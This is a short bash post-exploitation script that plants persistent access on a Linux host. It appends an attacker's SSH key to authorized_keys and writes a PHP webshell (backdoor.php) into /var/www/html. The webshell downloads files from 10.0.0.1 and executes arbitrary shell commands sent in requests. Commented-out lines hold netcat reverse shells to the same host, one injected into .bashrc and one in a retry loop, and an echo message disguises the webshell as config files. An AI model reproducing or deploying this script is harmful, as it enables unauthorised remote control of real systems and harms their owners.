#!/bin/bash

LHOST='10.0.0.1'

#add backdoor to .bashrc
#echo "rm -f /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|nc ${LHOST} 8001 >/tmp/y" >> ~/.bashrc

#add ssh public key
echo "Adding SSH public key"
mkdir -p ~/.ssh;chmod 700 ~/.ssh;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9GZeKSMGHynnA1JPx7jMMWkMm0KHibo4Is6Z4aZG8K4mYDSr795HWpgvjGJhxtiDe2IJqJh+RfUFD6tuLekObyFuYwD5gexMSVO21uQhyGZm0fQu+P4h3O18ybnMKBGfP3hswY32WNxzTbnCF6tCi0aOL2tvRwf3dJRJCzuhggBu8lThxqxQoo3tkP/qR/98IXLDNPWiB0VQA80QyQMDJxr24lKZDjqp1kwg+lD7yc8pW0vrIiNrnTFDR1c7S9DL7359nC2mLKsXQiFvw3EgreKJvQkckDzSTIryEWFQO7PD9Ba3q+hN3YRi1L998ntkeunz5MP4KUv63i1Zr7X5oPQdWggltQ5ELno3fl0lWb9XAajhJVGOtBatbDKsEAABBMrA8eQX4N5DAE92/1OxtFyiv8iEifpLRjAm4HCOWWO2Kp6x0GWJ/TskAMHL8gIGNNJuruY+TLXcX9uDduVgKxNzBAnwY0pqrmZ+4jbgz0aYKAYZZhPvj8+ETlFTLFAE= root@kali' >> ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys

#nc for loop
#while(true); do rm -p /tmp/z;mkfifo /tmp/z;cat /tmp/z|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/z; sleep 10; done

#Create a webshell
DIR="/var/www/html/"
if [ -d "${DIR}" ]; then
  # Take action if $DIR exists. #
  echo "Installing config files in ${DIR}..."
  cat 1>/dev/null << 'EOD' >> ${DIR}/backdoor.php
  <?php
   if (isset($_REQUEST['fupload'])) {
    file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.0.0.1:80/" . $_REQUEST['fupload']));
   };
   if (isset($_REQUEST['fexec'])) {
    echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
   };
  ?>
EOD
  
fi
